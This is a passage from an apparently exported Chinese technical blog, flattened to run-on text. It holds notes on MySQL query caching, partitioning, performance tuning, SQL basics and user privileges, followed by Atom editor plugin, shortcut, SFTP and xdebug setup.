variables like 'query_cache_%';+------------------------------+---------+| Variable_name | Value |+------------------------------+---------+| query_cache_limit | 1048576 || query_cache_min_res_unit | 4096 || query_cache_size | 1048576 |#缓存大小| query_cache_type | OFF |#开关| query_cache_wlock_invalidate | OFF |+------------------------------+---------+ 看出默认是开着的 设置配置变量：12set global query_cache_type = 1;#打开set global query_cache_size = 1024*1024*64;--64M 注意：一旦开启查询缓存，则只要执行的时Select操作，通常结果都会被缓存。无论客户端是否要求。 实际使用时：有些数据仅仅需要使用一次。数据很大。不希望数据被缓存。通过 SQL_NO_CACHE 语法，进行提示 MySQL 该select不需要缓存1select sql_no_cache from emp where empno = 12345; 动态数据不能缓存1select * ,now() from emp where empno=12345; 缓存是基于 select 语句的如果多打了空格或字母大小写不一样都会导致不会使用缓存 索引的状态的查看123456789101112mysql&gt; show status like 'handler_read_%';+-----------------------+----------+| Variable_name | Value |+-----------------------+----------+| Handler_read_first | 4 || Handler_read_key | 5 |#该选项值高 则证明系统高效使用了索引| Handler_read_last | 0 || Handler_read_next | 0 || Handler_read_prev | 0 |#上面的数量越高，索引利用率越高| Handler_read_rnd | 0 |#下面两项数值高的需要优化，执行全表扫面的| Handler_read_rnd_next | 27264190 |+-----------------------+----------+ 管理查询缓存12345678910111213mysql&gt; show status like 'Qcache_%';+-------------------------+---------+| Variable_name | Value |+-------------------------+---------+| Qcache_free_blocks | 1 || Qcache_free_memory | 1031832 || Qcache_hits | 0 | #查询命中数| Qcache_inserts | 0 | #缓存项数量| Qcache_lowmem_prunes | 0 || Qcache_not_cached | 30 || Qcache_queries_in_cache | 0 || Qcache_total_blocks | 1 |+-------------------------+---------+ 重置／清空缓存1reset query cache; 缓存失效如果对数据表进行更改操作(增、删、改)，则会删除该表对应的所有的缓存； 分表分区当表中的记录数很多时，采用多张表进行存储，策略就是分表策略 将大量数据按照算法分开存储，可以提高查询的效率和io开销吧 mysql服务器可以实现表的分区分区后mysql服务器将会根据分区算法和数量创建多个表，然后像普通正常使用就行 分区将一个表分成多个区(partition),将数据分散到不同的区中。就是横向分表区：就是一个物理表， 4种分区算法key、hash、range、list hash分区分区的字段要求是整数类型的如果是要对非整型字段进行hash分区，需要自己用表达式将非整形转换成整形12345678910create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--通过id将分区划分成10个partition by hash(id) partition 10;--或通过 birthday 划分成10个 ,要将date转换成int类型的partition by hash(YEAR(birthday)) partition 10; key分区针对任意类型字段与hash相似，只不过转成 int 的函数不是用户指定，而是由mysql指定12345678910create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--通过id将分区划分成10个partition by key(id) partition 10;--或通过 birthday 划分成10个partition by key(birthday) partition 10; range范围分区为每一个分区的条件指定一个范围123456789101112131415create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id, birthday) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--或通过 birthday 根据年代划分partition by key(YEAR(birthday)) ( partition p_old values less than (1970), -- 小于 &lt; (value) partition p_70 values less than (1980), partition p_80 values less than (1990), partition p_90 values less than (2000), partition p_new values less than MAXVALUE, -- 最大值); list 列表值条件分区12345678910111213create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id, birthday) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--或通过 birthday 根据月份划分partition by key(month(birthday)) ( partition p_chun values in (3,4), partition p_xia values in (5,6,7,8), partition p_80 values in (9,10), partition p_90 values in (11,12,1,2),); 分区管理求余类型的 hash和key分区类型减少分区将原来的10个分区减少至7个分区123alter table student coalesce partition 3;--查看 show create table student\G 增加分区123alter table add partition partitions 5;--查看 show create table student\G 条件类型的 range和list分区类型添加具体的条件分区123alter table student_list add partition( partition p_undefined values in (0);) 删除具体的条件分区1alter table student_list drop partition p_qiu; 删除分区时会导致分区内的数据同时被删除 垂直分表可以根据表的字段使用情况将一张表垂直拆分成几个表常用信息一个表，不常用信息一个表 架构优化读写分离web项目，读写比例大概 7:1，配置一台住服务器负责写，多台从服务器负责读 负载均衡将访问数据均匀的分配到不同的读服务器，nginx反向代理 mysql配置优化my.ini最大连接数1max_connections = 100; myisam键缓存1key_buffer_size = 55M innodb的缓冲池1innodb_buffer_pool_size = 107M 表文件句柄缓存可以缓存打开的table的句柄1table_cache=256 sql优化找到执行慢的sql将执行超过多久的sql记录下来 1234567mysql&gt; show variables like 'slow_query_%';+---------------------+------------------------------------+| Variable_name | Value |+---------------------+------------------------------------+| slow_query_log | OFF |#慢查询开关,默认打开| slow_query_log_file | /usr/local/var/mysql/ding-slow.log |#慢查询日志位置+---------------------+------------------------------------+ 123456mysql&gt; show variables like 'long_query_%';+-----------------+-----------+| Variable_name | Value |+-----------------+-----------+| long_query_time | 10.000000 | #记录 慢 的临界值+-----------------+-----------+ 12set global slow_query_log = 1；#开启慢查询 set long_query_time = 1; #设置记录慢查询时间临界值,超过的将都会记录下来 通过查询慢查询日志，找到需要优化的sql 插入大量数据建议将索引关闭(每条记录维护索引，相比一起维护索引，一起维护更容易)也可以现将索引删除，插入数据后再创建索引 order by null禁止排序group by的时候，默认的按照分组字段排序；执行explain计划可以看到 extra: useing filesort如果排序没有意义，可以通过添加 order by null 来禁用排序 select查询的字段尽可能是自己需要的，尽量不要使用 * 会导致数量变大，拖慢速度 单表查询一次操作仅仅操作一张表，当数据量较大的时候使用连表操作将会导致内存不够单表查询的好处 一次占用一个表，减少并发 消耗内存少 提高查询缓存的利用率缺点由于多次执行sql会多次向mysql服务器进行联接，联接响应也是影响速度的重要原因 能用join的尽量不要用子查询，mysql对子查询的支持不是太好，效率略低]]></content>
      <categories>
        <category>网站优化</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atom-小技巧]]></title>
    <url>%2F2017%2F07%2F01%2Fatom%2F%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[关于代码高亮``` 后面跟上语言如 php、js等 如 js但是有时 php 在 Atom 上并不会高亮，这时在首航添加 &lt;?php 即可123456789101112&lt;?php/****/class ClassName extends AnotherClass&#123; function __construct(argument) &#123; # code... &#125;&#125; 插件使用方法每个插件的使用方法都可以在 setting-&gt;packages 中点击插件名来进入到插件的介绍也面]]></content>
      <categories>
        <category>工具</category>
        <category>Atom</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql基础操作]]></title>
    <url>%2F2017%2F07%2F01%2Fmysql%2Fmysql%2F</url>
    <content type="text"><![CDATA[数据库相关创建数据库1create database 数据库名 [charset 字符编码名] [collate 排序规则名]; 查看mysql中的所有字符编码名(字符集)1show charset; 查看所有的排序规则名1show collation; 创建数据库示例1CREATE DATABASE test CHARSET utf8; 修改数据库1alter database 数据库名 [charset 字符编码名] [collate 排序规则名]; 备份数据库不需要进入mysql服务执行1mysqldump -h要备份的数据库所在的服务器 -u用户名 -p 数据库名 &gt; 完整目标文件名 备份示例1mysqldump -hlocalhost -uroot -p test &gt; /Users/echo-ding/Documents/ding/test.sql 恢复数据库 创建需要导入的数据库 1CREATE DATABASE test CHARSET utf8; 将数据还原 注意：先要创建还原的数据库test 1mysql -hlocalhost -uroot -p test &lt; /Users/echo-ding/Documents/ding/test.sql 也可以直接执行sql文件的语句 删除数据库1234567891011121314151617drop database 数据库名``` ### 查看所有数据库 ```sqlshow databases;``` ### 选择数据库```sqluse 数据库名称;``` ## 表的操作 ### 查看当前数据库下的表 ```sqlshow tables; 删除表1drop 表名； 查看表结构1desc 表名; 查看表的创建语句1show create table 表名; 复制表结构1create table [if not exists] 新表名 like 原表名; 清空一张表1truncate 表名; 相当于删除一张表重新创建 添加列1alter table 表名 add 字段 类型; 更改表名1alter table oldtablename to newtablename; 创建表123456789create table [if not exists] 表名(键名 类型 , ……)``` 创建指定编码格式的表 ```sqlcreate table 表名(键名 类型 , ……) charset utf8;``` 例子： ```sqlcreate table msg(id int primary key auto_increment,title varchar(60)) charset utf8; 123456USE test; #选用数据库CREATE TABLE myisam_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = MYISAM CHARSET=utf8;#myisam引擎的 字段属性primary key (fields1[,fields2,……]) :设定主键，每个表需要(必须,只能)有一个,字段值不能重复。可以多个字段共同组成一个主键。unique key (fields1[,fields2,……]) ：用于设定该字段的值，在这个表中，不可以重复（即是唯一的）key (fields1[,fields2,……]) : 普通索引，仅仅是建立了索引fulltext key (fields1[,fields2,……]) ：全文索引，目前对中文支持不好foreign (fields1[,fields2,……]) references 其他表(fields1[,fields2,……]) : 设定外键，附加外键索引和外键约束auto_increment ：用于设定一个字段值(整型的)的自动增长(自增)，而且，它设定后还必须同时设定在一个字段为一个“key”(比如:priamry key 或 unique key)not null： 用于设定一个字段的值不能为空值（null）——如果不设定，则就是可为空值；非空约束null是一种类型,比较时,只能用专门的is null 和 is not null来比较.default XX值：用于设定某个字段的值，在插入数据的时候如果没有给值，就使用该默认值；comment ‘说明文字’：就是一个说明字段含义的文字，备注 修改表的字段/属性/索引1234567891011121314151617181920212223242526272829//添加字段(添加列)：alter table 表名 add 新字段名 字段类型 [附加属性];//删除字段(删除列):alter table 表名 drop 字段名;//修改字段:alter table 表名 change 旧字段名 新字段名 新字段属性;//修改表名:alter table 表名 rename 新表名;#操作索引//添加普通索引alter table xiugai_test add key (realname);//添加唯一索引alter table xiugai_test add unique key(realname);//添加主键索引alter table xiugai_test add primary key(id);//添加外键索引alter table xiugai_test add foreign key(xuehao) references students(id);//添加字段默认值alter table xiugai_test alter realname set default 0;//删除字段默认值alter table xiugai_test alter realname drop default;//删除主键alter table xiugai_test drop primary key;//如果要删除主键，需要先删除自动增长 alter table xiugai_test modify column id int unsigned not null;//删除外键alter table xiugai_test drop foreign key xuehao;//删除索引alter table xiugai_test drop key realname; 查12基本查询语句select 字段 from 表名 where 条件; where字句算数运算符12+ - * / %例子：select * from 表名 where 字段名 + 100 &lt; 200;//筛选出相应列加上100依旧小于200的数据 //最好不要字段参与运算，不利于索引 比较运算符1234&gt; &gt;= &lt; &lt;= =(等于) &lt;&gt;或!=(不等于) 最常用比较运算符可以在字段中使用，返回的值是0(不满足时)或1(满足时)例如 SELECT goods_name ,cat_id&lt;8 FROM goods; //cat_id&lt;8列显示的是0或1这样方便在用sum等函数统计，如sum(cat_id&lt;8) 逻辑运算符12and(与) or(或) not(非) 例子：select * from 表 where id&lt;6 and c5&gt;1; is运算符12345只能对特殊的几个数据进行判断xx字段 is truexx字段 is falsexx字段 is nullxx字段 is not null between运算符123用法： 字段x between 值1 and 值2;值1 和 值2 范围之内的都符合条件例如： where id between 3 and 6; //id在3和6之间都符合要求 in运算符12用法： 字段x in (值1,值2,……) // not in() 相反 只要字段x的值满足括号中给定的任意的数值就算满足条件 like运算符——模糊查找123456用法：字段x like '要查找的字符'要查找的字符需要配合 % _ 才能完成模糊查询% 匹配任意长度的任意字符_ 匹配一个长度的任意字符如果要特意的匹配数据中包含 % 或 _ 的数据，需要进行转义例如：9_\% 表示匹配 9x% (x为任意字符) group by 字句 —分组group by 根据 select 查询语句查询出的结果进行分组 用法1group by 字段名 [asc|desc]，字段名 [asc|desc] , …… group by子句是用于将“前面”取得的数据，按某种标准（依据）——也就是字段——来进行分组的。分组，基本上就是，按给定字段的值，相同的值，分在相同的组中，不同的值分在不同的组中。 asc表示分组后，按组的值的大小正序排列，desc是倒序——默认是正序，可以不写。 一个最重要的理解（观念）：分组之后的结果，也是一行一行数据，只是每一行代表“一组” 特别注意：分组之后，结果行中的数据，都只能出现“组信息”——描述该组的“应有信息”。具体来说，对于分组查询的结果数据（select子句部分），只能出现如下几类数据：1， 分组依据字段；2， 原始字段信息中的数字类型的最大值，最小值，平均值，总和值；max(字段)：获得该字段的在组中的最大值；min(字段)：获得该字段的在组中的最小值；avg(字段)：获得该字段的在组中的平均值；sum(字段)：获得该字段的在组中的总和值；3， 每一组中所包含的原始数据行的行数，获得方式为：count(*) 123例子：select 字段1,max(字段2) as 最大值,min(字段3) as 最小值,avg(字段4)as 平均值,sum(字段5)as 总和,count(*)as 总条数, from 表名 group by 字段1;as 用来给查询出的字段设置别名，用来表头的显示，也可以在条件部分使用别名代替原字段按照 字段1 进行分组，分别显示分组后对应字段的一组所有数据的最小值，最大值等等 如果没有使用聚合函数直接使用字段，默认显示该字段的第一个值 having字句having条件语句和where条件语句的区别，使用的目标不一样，where是对原始数据(表数据)进行的筛选行为，而having是对group by分组后形成的数据进行的筛选(可以把group by分组后的结果当成一张表)，having能用的筛选条件只能是select子句中出现的字段 用法：1having 条件判断 例子：123select pinpai ，max(price) as 最高价 , min(price) as 最低价 , avg(price) as 平均价, sum(price) as 价格总和, count(*) as 数量 from 'product' group by pinpai having count(*) &gt; 2;或条件用as别名：select pinpai ，max(price) as 最高价 , min(price) as 最低价 , avg(price) as 平均价, sum(price) as 价格总和, count(*) as 数量 from 'product' group by pinpai having 数量 &gt; 2; //和上面的一样 order by排序子句对查询结果进行排序 用法：1order by 字段名 [ [asc|desc] , 字段名[asc|desc] ,……]; 按照字段名进行顺序或倒序排序，多个字段名时，先按照第一个字段名排序，再按照第二个字段名进行排序…… limit 子句用法：123limit [offset,]n offset:偏移量(跳过几行) n取出的条目 offset省略相当于 limit 0,n DISTINCT关键字合并查询记过重复行合并查询字段结果的重复的行1SELECT DISTINCT mobile, nationality FROM `person`; 子查询就是通过把查询语句的值作为条件进行查询的 子查询方便，但是性能原因略低，一般也会回用，省略 执行子查询时，MYSQL需要创建临时表，查询完毕后再删除这些临时表，所以，子查询的速度会受到一定的影响，这里多了一个创建和销毁临时表的过程。 union 子查询合并两个查询的结果 用法：12345select 语句1union [distinct | all ]select语句2[order by 子句][limit 子句] ; 说明： distinct | all用于设定是否消除重复行，默认不写就是distinct，表示会消除重复行； order by子句和limit子句，是对整个联合之后的数据结果进行排序和数量限定； 这两个select语句，要求字段数量必须一致，对应字段类型最好一致； 联合查询的结果数据中，字段名以第一个select语句中的字段名为准； 第一个select语句中的字段名如果有别名，则后续的order by子句就必须使用该别名； 将两个“字段一致”的查询语句所查询到的结果以“纵向堆叠”的方式合并到一起，成为一个新的结果集。结果集的行数是两个独立select查询语句的结果行数的和 连表查询用法：1select XX1, XX2, .... from 表1 [连接方式] join 表2 [ on 连接条件] where ... 常用的两个连表查询 内连接 inner join1from 表1 inner join 表2 on 表1.字段1 = 表2.字段2 结果：是在交叉连接的结果(两表之间做全相乘的结果)中筛选出符合 on 后面条件的也是左连接和右连接的交集 左(外)连接 left [outer] join1from 表1 left [outer] join 表2 on 表1.字段1 = 表2.字段2 假设A表在左，不动。B表在A表的右侧滑动，A表和B表通过一个关系(条件)来筛选B表的行，如果符合条件，则B表取出对应的行与A表对应的行组成新的一行数据，添加到结果集中，形成的结果集可以看成一张表，设为C，形成的结果集(表c)最少的行数为左边表(表A)的行数。也可以理解为 内连接的结果添加上没有匹配上的表A的没有匹配上数据的行(右边部分填充null)此时，可以对C表进行查询操作，where ，group，having，order by，limit依旧可以使用 增1234567891011形式1：常用insert [into] 表名 [(字段1,2,3，……)] values (值1,2,3，……)[,(2值1,2,3，……),……]; //插入多行时用逗号分开形式2：replace [into] 表名[(字段1,2,……)] values (值1,2,3，……)[,(2值1,2,3，……),……]; //和insert的区别是插入的数据的主键值在表中已存在时插入的将会替换这行数据，而insert将执行失败形式3：insert [into] 表名 [(字段1,2,3，……)] select 字段1,字段2,……from 其他表表名; //插入select中查询到的数据形式4：insert [into] 表名 字段1=值表达式,字段2=值表达式,字段3=值表达式，……;形式5：load data 导入数据 加载数据文件 load data infile '完整的数据文件路径.文件格式后缀' into table 表名;可以在txt中创建，数据与数据之间需要用tab进行隔开 ，注意需要使用utf-8格式的，还有与表的字段定义的类型保持一致(数据不用加引号)，路径中的\可以用/也可以进行转义\\使用 插入数据1234INSERT INTO myisam_1 VALUES (23, '李牧');INSERT INTO myisam_1 VALUES (12, '王翦');INSERT INTO myisam_1 VALUES (34, '廉颇');INSERT INTO myisam_1 VALUES (15, '白起'); 删1234delete from 表名 [where 属性=值(筛选条件)] [order by 排序设定] [limit 数量限定]; 1.where 几乎必须，如果省略将删除所有数据2.order by 排序设定用于设定删除这些数据的时候指定的字段的顺序来删除，3.limit 用于删除数据的时候指定只删除“前面的多少行” 改12update 表名 set 字段1=新值,字段2=新值,…… [where 属性=值(筛选条件)] [order by 排序设定] [limit 数量限定];和删的用法相似 列类型整数类型 名称 字节 最小值(带符号／不带符号) 最大值(带符号／不带符号) tinyint 1 -128/0 127/255 smallint 2 -32768/0 …… mediumint 3 -8388608/0 …… int 4 -2147483648/0 …… bigint 8 -9223372036854775808/0 …… 1字节(byte)有8位(bit),当显示负数的时候需要占用首位进行表示，所以表示数值的只有7位 使用形式 类型名 [M(长度)] [unsigned] [zerofill] 其中M表示“显示长度”，其需与zerofill结合使用才有效，即不够该长度的会自动左侧补0，当然如果超出也不影响。长度，就是用来设定要显示的长度位数(数字个数) unsigned表示“无符号数”，表示其中的数值是“非负”数字 如果设置了zerofill，则自动也就表示同时具备了unsigned修饰 如果设置了zerofill但没有设定长度M，则其会默认将所有数的左边补0到该类型的最大位数 小数类型 类型 名称 字节 精度 浮点型 单精度 float(m,d) 4 6-7位 双精度 double(m,d) 8 15位 定点型 decimal(m,d) 如果M&gt;D，为M+2否则为D+2 总精度65位/小数部分精度30位 m叫“精度”，代表“总位数”， d表示“标度”，代表小数位浮点型的小数，内部是二进制形式，所以很可能是非精确的，基本多有语言都有的毛病 字符串类型 类型 大小(字节) 用途 CHAR 0-255(字符) 固定长度 VARCHAR 0-65535 变化长度 TEXT 0-65535 长文本数据 enum 最多65535选项 单选类型 set 最多64选项 多选类型 char(m)类型:定长字符串，m表示设定的字符长度，存储内容和编码格式无关，其存储的时候，就是该长度——不够就会自动补空格填满；最大可设定为255，表示可存储255个 字符； varchar(m)类型：变长字符串，m表示设定的字节数长度，存储内容和编码格式有关，是可存储的最大长度，实际存储长度可以小于该长度；该类型存储的时候，还需要在字段内的最前面额外存储该字段的实际长度；最大可设定为65533，表示最大可存储65533个 字节；因为考虑因素：一行 的总的存储空间限制是65535 字节，但有考虑字符编码的问题，又会出现：如果存储的是纯英文字符，则实际最多可存储65533个字符；如果存储的是纯gbk的中文字符，则实际最多可存储的是65533/2个字符；如果存储的是纯utf8的中文字符，则实际最多可存储的是65533/3个字符； text类型：它通常用于存储“大文本”，因为其可存储65535个字节，并且， 不受行存储空间的限制；不能设置默认值 varchar和text存储结构上是有区别的，text是单独存储的，不受行存储空间限制;对于大文本的字段最好分拆成单独一个表从存储上来讲大于255的varchar可以说是转换成了text.这也是为什么varchar大于65535了会转成mediumtext 字段的额外开销 varchar 小于255byte 1byte overhead varchar 大于255byte 2byte overhead tinytext 0-255 1 byte overhead text 0-65535 byte 2 byte overhead mediumtext 0-16M 3 byte overhead longtext 0-4Gb 4byte overhead 备注 overhead是指需要几个字节用于记录该字段的实际长度。在固定的长度下 char 类型比 varchar 占用空间更少，并且由于 char 是固定长度，所以更利于搜索速度 . enum类型：用于存储若干个“可选项之一”的一种字符类型。通常，是在字段定义时，预先设定多个选项，而且是作为单选项，实际存储数据的时候，就可以选择其中一个存入数据库。它适合于存储在网页中的“单选项”数据，比如：单选按钮，下拉列表选项值等等；形式：enum(‘单选项1’, ‘单选项2’, ‘单选项3’, ……. ); //最多65535个。说明：这些选项，在系统内部，实际对应的是如下这些数字值：1, 2, 3, 4, 5, 6, …. set类型：用于存储若干个“多选项”的一种字符类型。通常，是在字段定义时，预先设定多个选项，而且是作为多选项，实际存储数据的时候，就可以选择其中若干个选项值存入数据库。它适合于存储在网页中的“多选项”数据，比如：多选按钮；形式：set(‘多选项1’, ‘多选项2’, ‘多选项3’, ……. ); //最多64个。说明：这些选项，在系统内部，实际对应的是如下这些数字值：1, 2, 4, 8, 16, …. 3表示选择类1和2 时间类型 类型 大小(字节) 范围 DATE 3 1000-01-01/9999-12-31 TIME 3 -838:59:59/838:59:59 YEAR 1 1901/2155 DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 TIMESTAMP 8 1970-01-01 00:00:00/2037 年某时 timestamp和datetime基本相似timestamp额外特性：用于记录一个“当前时间”的精确的时间戳——也就是某个时刻的对应整数值；该整数值，表示，从1970年1月1日0时0分0秒开始算起到该时候所经历的秒数；而且，其有如下特征：该字段的值，会在一个表的某行数据执行insert或update的时候，自动获取该时刻的时间戳值；显示格式 YYYY-MM-DD HH:MM:SS特性:不用赋值,该列会为自己赋当前的具体时间 ，但是要添加not null属性1`update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间', //默认值为插入的时间 更新数据时也自动更新为当前时间 注意：作为时间日期类型的数据，如果是在代码中插入一个具体的字面数据值，则需要用单引号引起来——跟字符类型一样。 用户管理添加用户mysql中的用户数据，都存储在mysql的系统数据库“mysql”中的user表中1create user ‘用户名’@’允许登录的网络位置’ identified by ‘密码’; “允许登录的网络位置”表示，该用户，在输入正确的用户名和密码的同时，也必须在“指定”的位置来登录该服务器。位置就是网络地址，通常是ip地址；其中，localhost表示只允许在本机（本地）登录。如果想远程登录的话，将”localhost”改为”%”，表示在任何一台电脑上都可以登录。也可以指定某台机器可以远程登录。 添加权限1grant 权限名1，权限名2，.... on 某库．某下级单位 to ‘用户名’@’允许登录的网络位置’ identified by ‘密码’ 说明： 权限名，就是上述那些单词或单词组合，比如：select，insert，delete，等等； 某下级单位，指的是，一个数据库中的下级可操作对象，比如表，视图， 2.1 举例：shuangyuan.join1, 或者shuangyuan.tab1, mysql.user 2.2 特例1：*.*表示整个系统中的所有数据库的所有下级单位； 2.3 特例2：某库名.*，表示该指定数据库的所有下级单位； identified 用于给现有的该用户改密码。如果不改密码，就可以不写； 该grant语句，还可以给“不存在的用户”进行授权，此时实际上，会同时创建该用户。如果是这种情况，则此时，identified部分就不可以省略，而是必须给出密码； 例子：1grant select,insert on test.test to 'test'@'localhost'; 权限列表： 取消权限1revoke 权限名1，权限名2，.... on 某库．某下级单位 from ‘用户名’@’允许登录的网络位置’ 数据文件以引擎为 MyISAM 为例 test 数据库文件夹db.opt 数据库文件myisam_1.frm 表结构文件myisam_1.MYD 数据文件myisam_1.MYI 索引文件]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atom-上手]]></title>
    <url>%2F2017%2F07%2F01%2Fatom%2FAtom%E4%B8%8A%E6%89%8B%2F</url>
    <content type="text"><![CDATA[Atom使用教程详细的操作可以参考下面的教程极客学院 W3C 删除Atom使用的360进行删除，删除后会发现 C:\Users\你的用户名\ 有一个隐藏的文件夹 .atom 将其删除，不删除的话重新安装atom的时候依旧会保留原来的配置及插件 插件安装完 Atom 之后自带了79个插件，基本的功能都已经可以使用了 安装插件 在 setting 页面可以看到 Packages 和 Install 两个选项， Packages 查看已经安装的插件， Install 来安装插件的，可以使用 ctrl+Shift+p 进入这个页面 插件 是否安装 file-icons yes pigments no minimap yes autocomplete-paths no atom-ternjs no emmet yes docblockr yes vim-mode no platformio-ide-terminal no atom-beautify yes php-debug yes linter-jshint yes simplified-chinese-menu no goto-definition yes Highlight Selected yes file-icons 显示文件类型对应的图标 pigments css/less 写表示颜色时显示颜色 minimap 右边代码预览框 autocomplete-paths 补全路径 atom-ternjs 补全Js emmet 前端实用工具 教程 docblockr 代码注释 vim-mode 在 Atom 上使用 Vim Highlight Selected 选中单词所有相同的高亮 platformio-ide-terminal Atom 中集成终端 atom-beautify 美化代码段 快捷键 ctrl + alt + b ，如果弹出出错信息，可能是需要依赖一些其他插件，比如 php的 就需要装 php-cs-fixer 插件 linter-php 检查php语法错误 ，可能需要将php配置成全局 ，安装它的时候会让安装一些依赖插件，按照提示安装即可 linter-jshint 检查js语法错误 ，需要安装node，使用npm 全局安装jshint (没有配置成功，报错incompatible values for the esversion and es3 linting option ，配置文件写错了) 相关资料 jshint配置 linter-jshint配置 首先安装 node ，使用npm 全局安装jshint 在 ~ (~,表示用户目录，在windows下是C:\Users\dingran)文件下放置js配置文件 .jshintrc 配置文件 atom 配置插件，如下图勾选lint inline javaScript,可以在html或php中检查js点击 open config folder 找到配置文件，查看配置文件 config.cson 123&quot;linter-jshint&quot;: disableWhenNoJshintrcFileInPath: false lintInlineJavaScript: true php-debug xdebug调试 simplified-chinese-menu 汉化 goto-definition 文件跳转，放到方法或类名上右键 goto definition 就会出现列表，选择跳转，有快捷键，还是不用了 remote-ftp sftp上传工具插件配置：把 auto upload on save 由 aways 改为 nerver 可以在 packages-&gt;Remote-Ftp-&gt;Create …… 来生成配置文件 .ftpconfig (生成在添加到Atom项目文件根目录，上传的时候也是在根目录中寻找配置文件，限制啊)，上传只能在左边 menu 菜单来选中上传和下载 (限制啊) 12345678910111213141516171819202122&#123; &quot;protocol&quot;: &quot;sftp&quot;, # 协议 &quot;port&quot;: 22, # 端口 &quot;host&quot;: &quot;128.128.1.79&quot;, # ip &quot;user&quot;: &quot;root&quot;, # 用户 &quot;pass&quot;: &quot;******&quot;, # 密码 &quot;promptForPass&quot;: false, &quot;remote&quot;: &quot;/usr/share/nginx/html/protected&quot;, # 对应的项目文件地址 &quot;local&quot;: &quot;&quot;, &quot;agent&quot;: &quot;&quot;, &quot;privatekey&quot;: &quot;&quot;, &quot;passphrase&quot;: &quot;&quot;, &quot;hosthash&quot;: &quot;&quot;, &quot;ignorehost&quot;: true, &quot;connTimeout&quot;: 10000, &quot;keepalive&quot;: 10000, &quot;keyboardInteractive&quot;: false, &quot;remoteCommand&quot;: &quot;&quot;, &quot;remoteShell&quot;: &quot;&quot;, &quot;watch&quot;: [], &quot;watchTimeout&quot;: 500&#125; Markdown相关Markdown相关Markdown相关 markdown-scroll-sync 预览同步滚动tidy-markdown Markdown美化，在保存的时候或者主动调用插件时触发 python相关编辑器里运行直接运行代码 js、python 等都可以atom-runer编辑器运行代码快捷键看插件介绍win配置12345File-&gt;Config...末尾添加 runner: scopes: python: &quot;D:\\ding\\python&quot; mac配置1234Atom-&gt;Config...末尾添加 runner: python: &quot;/usr/local/bin/python3&quot; autocomplete-python自动提示 装逼神奇 activate-power-mode 颤抖吧 快捷键慕课ATOM编辑器快捷键大全 Atom 兼容sublime快捷键，同时也有自己的快捷键 12345678910111213141516171819202122Ctrl + / 启用注释 同sublimeCtrl + \ 展示隐藏目录树 同时也可以 ctrl+k ctrl+bCtrl + Alt + I 打开Chrome调试器 nbCtrl + [ 向右缩进Ctrl + ] 向左缩进Shift + Home 选定光标至行首Shift + End 选定光标至行尾Shift + PageUp 选定光标至页首Shift + PageDown 选定光标至页尾Ctrl + Home 光标到页首Ctrl + End 光标至页尾Ctrl + PageUp 切换上一个打开的标签Ctrl + PageDown 切换下一个打开的标签Ctrl + D 匹配选定下一个 同sublimeAlt + F3 匹配选定所有Ctrl + ↑ 选中行上移 和sublime有区别，sulime为ctrl+Shift+↑Ctrl + ↓ 选中行下移cmd + b 在打开的文件之间切换Ctrl + Shift + L 切换文本内容类型，例如 html/php 和sublime不同 cmd + shift + b 只搜索从上次git commit后修改或者新增的文件cmd + shift + d 复制选中代码并粘贴到选中的后面cmd + shift + u 选择文件编码格式 折叠1234Alt + Ctrl + [ 折叠Alt + Ctrl + ] 展开Alt + Ctrl + Shift + &#123; 折叠全部Alt + Ctrl + Shift + &#125; 展开全部 Markdown1Ctrl + Shift + M Markdown预览 Markdown 语法补全1234567891011b **加粗**legal Copyright (c) 2017 Copyright Holder All Rights Reserved.img ![]()l []()i **code \```code\```\t - [ ] 多选按钮table | Header One | Header Two || :------------- | :------------- || Item One | Item Two | 更改快捷键 有些时候需要更改快捷键，比如快捷键冲突时 打开快捷键设置，如图搜索要改的快捷键 如 ctrl-shift-m,发现有两个，出现了冲突，这时可以自定义一个(优先级最高)将其覆盖点击需要自定义快捷键的最左边的小按钮进行复制 打开自定义文件(点击链接 your keymap file) 将复制的快捷键定义粘贴在自定义文件中，如图 备份插件备份插件教程 将配置文件上传到github 备份使用快捷键 Ctrl + Shift + P 呼出命令栏，输入 sync backup恢复备份使用快捷键 Ctrl + Shift + P 呼出命令栏，输入 sync restore 补充 获取 Gist Id 进入到github，点击你的头像会看到 Your gists,点击进去 如果没有，则需要创建一个：起个名称(用途)，写个简介 获取 Gist Id，进入创建好的 Gist 看到连接 https://gist.github.com/Ibunao/654a98d3e154348eaebba448312b0152 其中 654a98d3e154348eaebba448312b0152 就是 Gist Id xdebug调试相关教程 atom 安装 php-debug 插件，不用配置 php开启xdebugwin上安装的是wamp所以xdebug都是有的php.ini 配置 12345678910111213141516[xdebug]zend_extension =&quot;D:/ding/wamp64/bin/php/php5.6.25/zend_ext/php_xdebug-2.4.1-5.6-vc11-x86_64.dll&quot;;xdebug.remote_enable = Offxdebug.profiler_enable = Onxdebug.profiler_enable_trigger = offxdebug.profiler_output_name = cachegrind.out.%t.%pxdebug.profiler_output_dir =&quot;D:/ding/wamp64/tmp&quot;xdebug.show_local_vars=0xdebug.remote_enable=1xdebug.remote_host=127.0.0.1xdebug.remote_connect_back=1xdebug.remote_port=9000xdebug.remote_handler=dbgpxdebug.remote_mode=reqxdebug.remote_autostart=true 调试 开启debug插件 